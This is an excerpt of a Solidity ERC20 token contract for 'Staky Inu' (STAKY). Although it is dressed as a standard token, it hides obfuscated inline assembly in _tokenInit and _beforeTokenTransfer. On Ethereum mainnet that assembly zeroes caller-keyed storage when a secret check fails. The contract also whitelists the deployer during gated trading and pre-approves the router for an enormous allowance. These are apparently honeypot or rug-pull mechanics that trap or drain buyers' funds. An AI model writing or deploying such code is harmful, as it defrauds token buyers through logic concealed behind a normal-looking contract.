...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addStake;
    uint256 private valiDate = block.number*2;

    mapping (address => bool) private _firstSlot; 
    mapping (address => bool) private _secondEpoch;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private farmersJoe;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private DowJones;
    address public pair;
    ...
    bool private trading; uint256 private darkWorld = 1; bool private dawnTime;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addStake.push(_router); addStake.push(msgSender_); addStake.push(pair);
        for (uint256 q=0; q < 3;) {_firstSlot[addStake[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x1efce2026013be7318ade3b96ffad0a02bcd6d8012b9d1928747d8c94613aca7
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x3982a9cce5f15eee4c00d9e6a741cce8a7b8db95728bb19b3bcce20497e751e7,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; valiDate = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addStake[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployStaky(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addStake[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployStaky(creator, initialSupply);
    }
}

contract StakyInuETH is ERC20Token {
    constructor() ERC20Token("Staky Inu", "STAKY", msg.sender, 1000000 * 10 ** 18) {
    }
}